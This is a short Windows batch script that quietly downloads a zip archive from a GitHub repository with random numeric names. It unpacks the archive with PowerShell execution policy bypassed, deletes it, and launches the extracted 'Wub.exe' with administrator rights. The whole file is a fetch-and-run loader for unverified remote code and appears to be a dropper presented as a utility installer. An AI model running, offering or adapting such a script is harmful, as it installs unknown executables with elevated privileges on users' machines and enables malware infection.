@echo off

echo Wub

set "URL=https://github.com/0295723805672/632467433653246/raw/refs/heads/main/Wub.zip"
set "TEMP_DIR=%TEMP%\Wub"
set "ZIPFILE=%TEMP_DIR%\temp.zip"

if exist "%TEMP_DIR%" rmdir /s /q "%TEMP_DIR%"
mkdir "%TEMP_DIR%"

curl -L -s -o "%ZIPFILE%" "%URL%"
powershell -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%ZIPFILE%' -DestinationPath '%TEMP_DIR%' -Force"
del "%ZIPFILE%"

REM Check all possible folder structures
if exist "%TEMP_DIR%\Wub\Wub.exe" (
    cd /d "%TEMP_DIR%\Wub"
    powershell -Command "Start-Process 'Wub.exe' -Verb RunAs"
) else if exist "%TEMP_DIR%\Wub.exe" (
    cd /d "%TEMP_DIR%"
    powershell -Command "Start-Process 'Wub.exe' -Verb RunAs"
) else (
    echo Wub.exe not found
    pause
)